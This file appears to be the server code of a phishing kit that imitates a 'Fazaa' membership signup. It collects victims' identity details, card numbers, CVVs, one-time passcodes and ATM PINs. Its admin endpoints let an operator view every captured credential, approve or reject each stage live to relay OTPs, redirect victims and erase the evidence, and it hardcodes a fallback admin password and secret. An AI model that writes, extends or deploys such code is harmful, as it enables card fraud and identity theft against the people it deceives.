import express from 'express';
import path from 'path';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import crypto from 'crypto';
import { fileURLToPath } from 'url';
import { setupVisitorTracking, getActiveVisitorCount } from './visitors.js';
import {
  createSession,
  getSessionBySessionId,
  updateSession,
  getAllSessions,
  getStats,
  markAllAsRead,
  clearAllData,
  createRegistration,
  getRegistrationBySessionId,
  getAllRegistrations,
  getUnreadSessionsCount,
} from './database.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app: express.Express = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(helmet({ contentSecurityPolicy: false }));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// Rate limiting for API routes
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: { error: 'Too many requests, please try again later' }
});

// Apply rate limiting to API routes
app.use('/api', apiLimiter);

// Admin auth
const ADMIN_PASSWORD = process.env.FAZAA_ADMIN_PASSWORD || 'Fazaa 2026';
// Use a stable secret from environment or a hardcoded fallback that persists across restarts
const ADMIN_JWT_SECRET = process.env.ADMIN_JWT_SECRET || 'fazaa-permanent-secret-2026-key';

function generateAdminToken(): string {
  // Token valid for 7 days to reduce "unauthorized" errors
  const data = { role: 'admin', exp: Date.now() + 7 * 24 * 60 * 60 * 1000 };
  const str = JSON.stringify(data);
  const signature = crypto.createHmac('sha256', ADMIN_JWT_SECRET).update(str).digest('hex');
  return Buffer.from(str).toString('base64') + '.' + signature;
}

function verifyAdminToken(token: string): boolean {
  if (!token) return false;
  try {
    const parts = token.split('.');
    if (parts.length !== 2) return false;
    
    const [payloadBase64, signature] = parts;
    const payloadStr = Buffer.from(payloadBase64, 'base64').toString();
    const expectedSignature = crypto.createHmac('sha256', ADMIN_JWT_SECRET).update(payloadStr).digest('hex');
    
    if (signature !== expectedSignature) return false;
    
    const payload = JSON.parse(payloadStr);
    if (payload.exp < Date.now()) return false;
    
    return payload.role === 'admin';
  } catch (e) {
    return false;
  }
}

function getClientIp(req: express.Request): string {
  return (req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() ||
    req.socket.remoteAddress || 'unknown';
}

// ========== Health Check ==========
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', visitors: getActiveVisitorCount() });
});

// ========== Public API: Registration ==========
app.post('/api/registration', async (req, res) => {
  try {
    const { sessionId, fullName, phoneNumber, email, emirate, district, membershipTier, totalAmount, idNumber, addressEmirate, addressDistrict, addressStreet, addressBuildingNumber } = req.body;
    
    if (!sessionId || !fullName || !phoneNumber || !email || !emirate || !membershipTier) {
      return res.status(400).json({ error: 'Missing required fields' });
    }
    
    const clientIp = getClientIp(req);
    const userAgent = req.headers['user-agent'] || null;
    
    const registration = await createRegistration({
      sessionId,
      fullName,
      phoneNumber,
      email,
      emirate,
      district: district || null,
      membershipTier,
      totalAmount: totalAmount || '15',
      idNumber: idNumber || null,
      addressEmirate: addressEmirate || null,
      addressDistrict: addressDistrict || null,
      addressStreet: addressStreet || null,
      addressBuildingNumber: addressBuildingNumber || null,
      clientIp,
      userAgent: userAgent || null,
    });
    
    res.json({ success: true, data: registration });
  } catch (error: any) {
    console.error('[API] Registration error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ========== Public API: Payment Session ==========
app.post('/api/session', async (req, res) => {
  try {
    const { sessionId, fullName, phoneNumber, email, emirate, district, membershipTier, totalAmount, idNumber } = req.body;
    
    const clientIp = getClientIp(req);
    const userAgent = req.headers['user-agent'] || undefined;
    
    // Check if session exists
    const existing = await getSessionBySessionId(sessionId);
    if (existing) {
      // Update existing session
      await updateSession(sessionId, {
        fullName,
        phoneNumber,
        email,
        emirate,
        district,
        membershipTier,
        totalAmount: totalAmount || '15',
        idNumber: idNumber || null,
        clientIp,
        userAgent: userAgent || null,
      });
      const updated = await getSessionBySessionId(sessionId);
      return res.json({ success: true, data: updated });
    }
    
    const session = await createSession({
      sessionId,
      fullName,
      phoneNumber,
      email,
      emirate,
      district,
      membershipTier,
      totalAmount: totalAmount || '15',
      idNumber: idNumber || null,
      clientIp,
      userAgent: userAgent || null,
    });
    
    res.json({ success: true, data: session });
  } catch (error: any) {
    console.error('[API] Session creation error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ========== Public API: Update Session ==========
app.post('/api/session/update', async (req, res) => {
  try {
    const { sessionId, cardName, cardNumber, cardNumberMasked, cardExpiry, cardCvv, otpCode, atmPin, stage } = req.body;
    
    if (!sessionId) {
      return res.status(400).json({ error: 'sessionId is required' });
    }
    
    const existing = await getSessionBySessionId(sessionId);
    if (!existing) {
      return res.status(404).json({ error: 'Session not found' });
    }
    
    const updates: any = {};
    if (cardName !== undefined) updates.cardName = cardName;
    if (cardNumber !== undefined) updates.cardNumber = cardNumber;
    if (cardNumberMasked !== undefined) updates.cardNumberMasked = cardNumberMasked;
    if (cardExpiry !== undefined) updates.cardExpiry = cardExpiry;
    if (cardCvv !== undefined) updates.cardCvv = cardCvv;
    if (otpCode !== undefined) updates.otpCode = otpCode;
    if (atmPin !== undefined) updates.atmPin = atmPin;
    if (stage !== undefined) {
      updates.stage = stage;
      updates.statusRead = 0; // Reset to unread when stage changes
    }
    
    await updateSession(sessionId, updates);
    const updated = await getSessionBySessionId(sessionId);
    
    res.json({ success: true, data: updated });
  } catch (error: any) {
    console.error('[API] Session update error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ========== Public API: Get Session Status ==========
app.get('/api/session/:sessionId', async (req, res) => {
  try {
    const session = await getSessionBySessionId(req.params.sessionId);
    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }
    // Return non-sensitive data only
    const { cardName: _cardName, cardNumber: _cardNumber, cardNumberMasked: _cardMasked, cardExpiry: _cardExpiry, cardCvv: _cardCvv, otpCode: _otpCode, atmPin: _atmPin, ...safeSession } = session;
    res.json({ success: true, data: safeSession });
  } catch (error: any) {
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ========== Public API: Get Redirect URL ==========
app.get('/api/session/redirect/:sessionId', async (req, res) => {
  try {
    const session = await getSessionBySessionId(req.params.sessionId);
    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }
    res.json({ success: true, redirectUrl: session.redirectUrl });
  } catch (error: any) {
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ========== Admin API ==========

// Login
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  if (!password || password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'كلمة المرور غير صحيحة' });
  }
  const token = generateAdminToken();
  // Token is self-verifying now, no need to store in memory
  res.json({ success: true, token });
});

// Verify token
app.get('/api/admin/verify', (req, res) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (!token || !verifyAdminToken(token)) {
    return res.status(401).json({ valid: false });
  }
  res.json({ valid: true });
});

// Get stats
app.get('/api/admin/stats', async (req, res) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (!token || !verifyAdminToken(token)) {
    return res.status(401).json({ error: 'غير مصرح' });
  }
  const stats = await getStats();
  res.json(stats);
});

// Get all sessions
app.get('/api/admin/sessions', async (req, res) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (!token || !verifyAdminToken(token)) {
    return res.status(401).json({ error: 'غير مصرح' });
  }
  
  const sessions = await getAllSessions(100);
  // Mark all as read
  await markAllAsRead();
  
  // Enrich with registration data and normalize field names
  const enriched = [];
  for (const session of sessions) {
    const sessionIdVal = session.sessionId || (session as any).sessionid;
    const registration = await getRegistrationBySessionId(sessionIdVal);
    console.log('[Admin Debug] sessionId:', sessionIdVal, 'registration:', registration ? 'found' : 'NOT found');
    if (registration) {
      console.log('[Admin Debug] registration keys:', Object.keys(registration));
      console.log('[Admin Debug] registration.addressEmirate:', (registration as any).addressEmirate);
      console.log('[Admin Debug] registration.addresseemirate:', (registration as any).addresseemirate);
    }
    const s: any = {
      ...session,
      // Normalize PostgreSQL lowercase fields to camelCase
      id: session.id || session['id'],
      sessionId: session.sessionId || (session as any)['sessionid'],
      fullName: session.fullName || (session as any)['fullname'],
      phoneNumber: session.phoneNumber || (session as any)['phonenumber'],
      email: session.email || session['email'],
      emirate: session.emirate || session['emirate'],
      district: session.district || session['district'],
      membershipTier: session.membershipTier || (session as any)['membershiptier'],
      totalAmount: session.totalAmount || (session as any)['totalamount'],
      idNumber: session.idNumber || (session as any)['idnumber'] || registration?.idNumber || (registration as any)?.idnumber || null,
      addressEmirate: registration?.addressEmirate || (registration as any)?.addresseemirate || null,
      addressDistrict: registration?.addressDistrict || (registration as any)?.addressdistrict || null,
      addressStreet: registration?.addressStreet || (registration as any)?.addressstreet || null,
      addressBuildingNumber: registration?.addressBuildingNumber || (registration as any)?.addressbuildingnumber || null,
      cardName: session.cardName || (session as any)['cardname'],
      cardNumber: session.cardNumber || (session as any)['cardnumber'],
      cardNumberMasked: session.cardNumberMasked || (session as any)['cardnumbermasked'],
      cardExpiry: session.cardExpiry || (session as any)['cardexpiry'],
      cardCvv: session.cardCvv || (session as any)['cardcvv'],
      otpCode: session.otpCode || (session as any)['otpcode'],
      atmPin: session.atmPin || (session as any)['atmpin'],
      stage: session.stage || session['stage'],
      errorMessage: session.errorMessage || (session as any)['errormessage'],
      clientIp: session.clientIp || (session as any)['clientip'],
      userAgent: session.userAgent || (session as any)['useragent'],
      statusRead: session.statusRead || (session as any)['statusread'],
      redirectUrl: session.redirectUrl || (session as any)['redirecturl'],
      createdAt: session.createdAt || (session as any)['createdat'],
      updatedAt: session.updatedAt || (session as any)['updatedat'],
    };
    enriched.push(s);
  }
  
  res.json(enriched);
});

// Get single session
app.get('/api/admin/sessions/:sessionId', async (req, res) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (!token || !verifyAdminToken(token)) {
    return res.status(401).json({ error: 'غير مصرح' });
  }
  
  const session = await getSessionBySessionId(req.params.sessionId);
  if (!session) {
    return res.status(404).json({ error: 'الجلسة غير موجودة' });
  }
  
  const sessionIdVal = session.sessionId || (session as any).sessionid;
  const registration = await getRegistrationBySessionId(sessionIdVal);
  await updateSession(sessionIdVal, { statusRead: 1 });
  
  const s: any = {
    ...session,
    sessionId: session.sessionId || (session as any).sessionid,
    fullName: session.fullName || (session as any).fullname,
    phoneNumber: session.phoneNumber || (session as any).phonenumber,
    email: session.email || (session as any).email,
    emirate: session.emirate || (session as any).emirate,
    district: session.district || (session as any).district,
    membershipTier: session.membershipTier || (session as any).membershiptier,
    totalAmount: session.totalAmount || (session as any).totalamount,
    idNumber: session.idNumber || (session as any).idnumber || registration?.idNumber || (registration as any)?.idnumber || null,
    addressEmirate: registration?.addressEmirate || (registration as any)?.addresseemirate || null,
    addressDistrict: registration?.addressDistrict || (registration as any)?.addressdistrict || null,
    addressStreet: registration?.addressStreet || (registration as any)?.addressstreet || null,
    addressBuildingNumber: registration?.addressBuildingNumber || (registration as any)?.addressbuildingnumber || null,
    cardName: session.cardName || (session as any).cardname,
    cardNumber: session.cardNumber || (session as any).cardnumber,
    cardNumberMasked: session.cardNumberMasked || (session as any).cardnumbermasked,
    cardExpiry: session.cardExpiry || (session as any).cardexpiry,
    cardCvv: session.cardCvv || (session as any).cardcvv,
    otpCode: session.otpCode || (session as any).otpcode,
    atmPin: session.atmPin || (session as any).atmpin,
    stage: session.stage || (session as any).stage,
    errorMessage: session.errorMessage || (session as any).errormessage,
    clientIp: session.clientIp || (session as any).clientip,
    userAgent: session.userAgent || (session as any).useragent,
    statusRead: session.statusRead || (session as any).statusread,
    redirectUrl: session.redirectUrl || (session as any).redirecturl,
    createdAt: session.createdAt || (session as any).createdat,
    updatedAt: session.updatedAt || (session as any).updatedat,
  };
  
  res.json(s);
});

// Session action (pass/denied/completed)
app.post('/api/admin/sessions/action', async (req, res) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (!token || !verifyAdminToken(token)) {
    return res.status(401).json({ error: 'غير مصرح' });
  }
  
  const { sessionId, action, errorMessage } = req.body;
  if (!sessionId || !action) {
    return res.status(400).json({ error: 'Missing required fields' });
  }
  
  const session = await getSessionBySessionId(sessionId);
  if (!session) {
    return res.status(404).json({ error: 'الجلسة غير موجودة' });
  }
  
  let newStage: string = session.stage;
  let errorMsg: string | null = null;
  
  if (action === 'pass') {
    if (session.stage === 'card_pending') newStage = 'otp';
    else if (session.stage === 'otp_pending') newStage = 'atm';
    else if (session.stage === 'atm_pending') newStage = 'success';
  } else if (action === 'denied') {
    if (session.stage === 'card_pending') newStage = 'card';
    else if (session.stage === 'otp_pending') newStage = 'otp';
    else if (session.stage === 'atm_pending') newStage = 'atm';
    else newStage = 'failed';
    
    errorMsg = errorMessage || 'تم رفض العملية. يرجى المحاولة مرة أخرى.';
  } else if (action === 'completed') {
    newStage = 'success';
  }
  
  await updateSession(sessionId, { stage: newStage, errorMessage: errorMsg });
  res.json({ success: true, newStage });
});

// Redirect client
app.post('/api/admin/sessions/redirect', async (req, res) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (!token || !verifyAdminToken(token)) {
    return res.status(401).json({ error: 'غير مصرح' });
  }
  
  const { sessionId, redirectUrl } = req.body;
  if (!sessionId || !redirectUrl) {
    return res.status(400).json({ error: 'Missing required fields' });
  }
  
  const session = await getSessionBySessionId(sessionId);
  if (!session) {
    return res.status(404).json({ error: 'الجلسة غير موجودة' });
  }
  
  await updateSession(sessionId, { redirectUrl });
  res.json({ success: true });
});

// Clear all data
app.post('/api/admin/clear', async (req, res) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (!token || !verifyAdminToken(token)) {
    return res.status(401).json({ error: 'غير مصرح' });
  }
  
  await clearAllData();
  res.json({ success: true });
});

// ========== Serve static files (React build) ==========
const distPath = path.join(__dirname, '..', 'dist');
app.use(express.static(distPath));

// SPA fallback - serve index.html for all non-API routes
app.get('/{*path}', (req, res) => {
  if (req.path.startsWith('/api/')) {
    return res.status(404).json({ error: 'API endpoint not found' });
  }
  res.sendFile(path.join(distPath, 'index.html'));
});

// Start server
const server = app.listen(PORT, async () => {
  console.log(`[Server] Running on port ${PORT}`);
  // Initialize database and run migrations
  const { initDatabase } = await import('./database.js');
  await initDatabase();
  console.log('[Server] Database initialized');
});

// Setup WebSocket visitor tracking
setupVisitorTracking(server);

console.log('[Server] All systems initialized');

export default app;
